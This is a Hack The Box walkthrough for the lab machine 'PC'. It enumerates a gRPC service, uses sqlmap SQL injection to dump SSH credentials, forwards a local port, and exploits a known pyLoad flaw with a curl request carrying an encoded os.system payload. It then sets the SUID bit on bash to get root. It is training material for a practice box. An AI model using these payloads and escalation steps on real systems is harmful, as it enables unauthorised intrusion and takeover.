---
title: "Hack The Box - PC [Easy]"
date: 2023-05-26T02:01:27+03:00
draft: false
tags: ["hackthebox"]
---

This machine has only 2 ports open:

```
$ nmap 10.10.11.214 -Pn -p-
22/tcp    open  ssh
50051/tcp open  unknown
```

Using telnet to see what is `50051`, we get:

```
telnet 10.10.11.214 50051
Trying 10.10.11.214...
Connected to 10.10.11.214.
Escape character is '^]'.
?�?� �?^CConnection closed by foreign host.
```
 
Which is some random binary data. I've explored it with `hexdump`.

```
0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff
0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000
0000020 0001 0400 0008 0000 0000 3f00 0000
000002e
```

I didn't figure out what it was, so I googled the port which led me to this question: https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p 

I've figured out that this is some `rpc` server. Using `grpcui` we can see the following app structure.

```
$ grpcui -plaintext 10.10.11.214:50051
--- 

SimpleApp.LoginUser {
    username string
    password string
}
SimpleApp.RegisterUser {
    username string
    password string
}
SimpleApp.getInfo {
    id string
}

```

I've used `admin:admin` to login, and I got a token and a data:

```json
{
  "message": "Your id is 80."
}

// token	b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk'
```

I've used the `Request Metadata` to send the token when calling the getInfo procedure. 

```
Meta:
token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk

Data:
id: 80
```

This got me:

```
{
  "message": "Will update soon."
}
```

I have no idea what is happening at this point, and I decided to run `sqlmap` on those requests.

To do that I had to capture the request that is going to the server, I can proxy the UI's requests towards the RPC with `burp`. Start `burp` and intercept the gRPC Web UI and capture the request towards the server. Then save the request to `getInfo` into a file.

Using `sqlmap -r request_file --batch` we can dump the credentials for the user and login with the `ssh`.

Now the root is a bit tricky, I've noticed some processes that are running on port 8000 using `linpeas`. This port is inaccessible, so I had to forward the port to my host using ssh.

```
$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
```

Now I can access it, and it turns out to be pyLoad, searching around I saw this:

https://github.com/advisories/GHSA-pf38-5p22-x6h6
https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d
https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/

Where I can see the following payload

```
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

Decoding the payload on the `jk` param: `pyimport os;os.system("touch /tmp/pwnd");f=function f2(){};`

Now we just have to encode `chmod +s /bin/bash` into `os.system()`. After executing that payload, we can launch bash in privilege mode `bash -p` and I got root.
